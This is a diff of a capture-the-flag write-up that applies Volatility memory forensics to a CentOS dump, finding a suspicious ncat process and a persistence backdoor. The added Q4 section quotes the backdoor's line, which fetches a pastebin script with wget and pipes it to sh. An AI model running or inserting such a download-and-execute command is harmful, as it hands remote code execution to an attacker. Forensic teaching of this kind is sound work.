@@ -48,14 +48,33 @@ Here is the command we will use
 python2 volatility/vol.py -f c73-EZDump/dump.mem --profile=LinuxCentos7_3_10_1062x64 linux_bash
 
 - python2 volatility/vol.py = launch volatility. 
--f c73-EZDump/dump.mem = specify the file to analyze
---profile=LinuxCentos7_3_1062x64 = the created cutom profile 
+- -f c73-EZDump/dump.mem = specify the file to analyze
+- --profile=LinuxCentos7_3_1062x64 = the created cutom profile 
 - linux_bash = the command that allows to see the history of bash commands. 
 
 ![Q2](/assets/Q2-seized.jpg)
 
+## [](#header-2) Q3 : What is the PID of the suspicious process?
+
+So first we need to list the processes with linux_pstree and see if any can be interpreted as odd or inappropriate. 
+The command. 
 ```
-this is a comand in a CLI
+python2 volatility/vol.py -f c73-EZDump/dump.mem --profile=LinuxCentos7_3_10_1062x64 linux_pstree
 ```
 
-![this is a pisture](/assets/Q3-seized.png)
+![ncat ? weird isn't it ?](/assets/Q3-seized.png)
+ncat ? weird isn't it ?
+
+## [](#header-2) Q4 : The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor?
+
+Remenber the bash history ? 
+```
+    2622 bash                 2020-05-07 14:56:25 UTC+0000   git clone https://github.com/tw0phi/PythonBackup
+```
+The attacker had to install elements of this guithub repository. 
+
+Looking at the repository in the file app/snapshot.py we can see that the content of a pastebin has been downloaded.
+```
+os.system('wget -O - https://pastebin.com/raw/nQwMKjtZ 2>/dev/null|sh')
+```
+Go to the url and you have the flag. 
